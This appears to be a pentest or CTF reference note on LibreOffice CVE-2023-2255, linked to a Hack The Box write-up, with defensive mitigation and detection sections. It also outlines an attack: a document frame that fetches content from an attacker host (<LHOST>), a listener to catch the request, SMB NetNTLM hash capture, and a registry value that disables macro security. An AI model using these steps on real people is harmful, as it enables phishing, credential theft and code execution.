---
topic: LibreOffice — external links loaded without prompt (CVE-2023-2255)
tags: [windows, libreoffice, cve-2023-2255, document, phishing, rce, office]
---

# LibreOffice — external links loaded without prompt (CVE-2023-2255)

[🌐 Español](libreoffice-weblink-rce.md) | **English**

## Idea

LibreOffice allows inserting floating frames linked to external files. In 7.4 before 7.4.7 and 7.5 before 7.5.3, opening a document containing such a frame loads the external content without asking the user. An attacker can host that content and make the document fetch it on open, which can execute code or capture credentials. On Office, the internal resume site accepted the document and `PPotts` opened it.

## When it applies

- LibreOffice in the affected range (7.4 < 7.4.7, 7.5 < 7.5.3).
- The victim opens documents sent by third parties.
- The configuration does not block external link updates.
- The attacker can host a file reachable from the victim (HTTP, SMB, WebDAV).

## Procedure

1. Create a document with a floating frame linked to an external file.
2. Host that file on a controlled server.
3. Deliver the document through the victim's channel (resume, email, ticket).
4. Wait for it to be opened and the link loaded.
5. Run the command or capture the request with credentials.

## Commands

```text
Insert → Frame → Link to file → http://<LHOST>/<RESOURCE>
```

```bash
python3 -m http.server 80
# log the request when the document is opened
```

```text
# alternative without the CVE: lower macro security in the registry
HKCU\Software\LibreOffice\Share\Security\Scripting\MacroSecurityLevel = 0
```

## Variants

- Link to an SMB resource to capture the victim's NetNTLM hash.
- Use a file LibreOffice interprets and runs on load.
- Combine with a macro if the security policy allows it.
- Send the document as `.odt`, `.docx` or `.ods` depending on the filter.

## Limitations

- Patched versions ask before loading external content.
- The victim must open the document and allow the load.
- A firewall may block egress to the attacker server.
- Macro and link policies may prevent execution.

## Mitigation

- Update LibreOffice to 7.4.7, 7.5.3 or later.
- Disable automatic external link updates.
- Block SMB/HTTP egress from workstations to the Internet.
- Open untrusted documents in an isolated environment.
- Enforce policies that prevent lowering macro security.

## Detection

- Documents with frames linked to external paths.
- Outbound HTTP, SMB or WebDAV from workstations when a file is opened.
- Child processes of `soffice.exe` (`cmd.exe`, `powershell.exe`).
- Changes to `MacroSecurityLevel` in the registry.

## References

- [NVD — CVE-2023-2255](https://nvd.nist.gov/vuln/detail/CVE-2023-2255)
- [LibreOffice — Security advisories](https://www.libreoffice.org/about-us/security/advisories/)
- [0xdf — Office](https://0xdf.gitlab.io/2024/06/22/htb-office.html)
- [Office writeup](../../machines/windows/office/README.en.md)
